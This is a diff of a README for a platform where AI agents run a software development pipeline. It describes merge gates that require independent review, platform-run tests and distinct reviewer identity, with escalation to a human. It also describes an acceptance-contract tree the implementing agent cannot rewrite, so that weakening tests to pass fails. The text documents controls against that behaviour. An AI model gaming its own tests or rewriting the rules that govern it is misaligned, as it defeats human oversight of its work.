+every line is asserted by the end-to-end acceptance suite, not a roadmap.
+Read it as the answer to "what do I actually get?"
 
-- **Declarative lifecycle.** Compile, preview, apply, edit and tear down a
-  company from one document; hiring and firing are diffs; firing revokes
-  identity.
+- **A software company from one document.** Compile, preview, apply, edit and
+  tear down a whole company from a single blueprint; hiring and firing are
+  diffs you read before they happen; firing revokes an agent's identity the
+  moment its row is deleted.
 - **A full SDLC.** Goal → tickets (intake) → implementation with a planner
   and executor crew → platform-run verification → pull request → ephemeral
   review with a posted findings comment and a structured verdict → merge.
-- **Quality as a gate policy owns.** The merge gate resolves the way the
-  blueprint declares. Delegate it, and a change in the declared path class
-  merges only when the independent review passed *and* the platform's own
-  re-run of the tests is green *and* the reviewer's identity is not the
-  implementer's — three facts, no LLM's word taken for any of them; the
-  merge fires with no human command. A failed layer files a bounded rework
-  ticket the heartbeat consumes, and at the rework bound it escalates to
-  the human; a change touching a protected surface (a merged PR must not be
-  able to rewrite the rules that govern merging) is refused by policy and
-  falls back to the human signal. Removing the delegation reverts to
-  human-only merge — revocation is a diff.
+- **Quality as a gate policy owns, not the agent.** The merge gate resolves
+  the way the blueprint declares. Delegate it, and a change in the declared
+  path class merges only when the independent review passed *and* the
+  platform's own re-run of the tests is green *and* the reviewer's identity
+  is not the implementer's — three facts, no LLM's word taken for any of
+  them; the merge fires with no human command. A failed layer files a
+  bounded rework ticket the heartbeat consumes, and at the rework bound it
+  escalates to the human; a change touching a protected surface (a merged PR
+  must not be able to rewrite the rules that govern merging) is refused by
+  policy and falls back to the human signal. Removing the delegation reverts
+  to human-only merge — revocation is a diff.
+- **The oracle the implementer cannot rewrite.** Delegating on "the tests
+  pass" only works if the workstream that writes the code cannot also write
+  the tests that grade it. A blueprint can split off an acceptance-contract
+  tree that a *different* crew authors and only a human merges; the gating
+  fact then becomes that contract *as it stands on the base ref*, run
+  against the new code, so a suite weakened to green launders nothing. The
+  implementer can no longer certify its own work — the containment is
+  positional, tested by a red-team that tries every way around it.
 - **Unattended operation under caps.** With a `conduct` section, a standing
   heartbeat runs the backlog itself: it dispatches the PM to choose the
   next action, starts it under compiled policy and declared caps
